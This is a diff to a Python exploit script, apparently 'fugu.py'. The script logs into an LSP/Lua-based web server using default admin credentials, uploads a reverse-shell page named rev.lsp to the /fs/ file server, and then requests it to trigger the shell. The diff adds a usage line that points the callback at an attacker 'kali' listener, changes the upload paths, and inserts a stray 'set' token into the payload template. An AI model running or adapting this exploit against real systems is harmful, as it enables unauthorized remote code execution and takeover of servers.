@@ -23,6 +23,7 @@ username = 'admin'
 password = 'password'
 email = 'admin@admin.com'
 
+# python fugu.py -r $hub -rp 8082 -l $kali -p 2000
 parser = argparse.ArgumentParser()
 parser.add_argument("-r", "--rhost", help="Victims ip/url (omit the http://)", required=True)
 parser.add_argument("-rp", "--rport", help="http port [Default 80]")
@@ -110,8 +111,8 @@ def login(r, s):
 
 def exploit(r, s):
     # Find the file server, default is fs
-    r = s.get(f"https://{url}:{sport}/fs/cmsdocs/")
-
+    # r = s.get(f"https://{url}:{sport}/fs/cmsdocs/")
+    r = s.get(f"https://{url}:{sport}/fs/")
     code = r.status_code
 
     if code == 404:
@@ -129,22 +130,35 @@ def exploit(r, s):
 	<?lsp if request:method() == "GET" then ?>
 		<?lsp 
         {shell}		
-		?>
+		?>set
 	<?lsp else ?>
 		Wrong request method, goodBye! 
 	<?lsp end ?>
 	'''
 
-    files = {'file': ('rev.lsp', file_content, 'application/octet-stream')}
-    r = s.post(f"https://{url}:{sport}/fs/cmsdocs/", files=files)
+    luaFile = 'rev.lsp'
+
+    files = {'file': (luaFile, file_content, 'application/octet-stream')}
+    r = s.post(f"https://{url}:{sport}/fs/", files=files)
 
     if r.text == 'ok':
         print(f"{Fore.GREEN}[+]{Fore.WHITE} Successfully uploaded, calling shell ")
-        r = s.get(f"https://{url}:{sport}/rev.lsp")
+        r = s.get(f"https://{url}:{sport}/fs/rev.lsp")
+        code = r.status_code
+        # r = s.post(f"https://{url}:{sport}/fs/rev.lsp")
+        # print(f"{Fore.GREEN}[+]{Fore.WHITE} User Created!")
 
 
+        code = r.status_code
+        print(f"{Fore.GREEN}[+]{Fore.WHITE} The upload of %s returned code %d" % (luaFile, code))
+
+        if code == 404 or code == 400:
+            print(f"{Fore.RED}[+]{Fore.WHITE} Unsuccessful execution")
+        else:
+            print(f"{Fore.GREEN}[+]{Fore.WHITE} Lua script uploaded ")
 if __name__ == '__main__':
     try:
         main()
     except:
         print(f"\n{Fore.YELLOW}[*]{Fore.WHITE} Good bye!\n\n**All Hail w4rf4ther!")
+
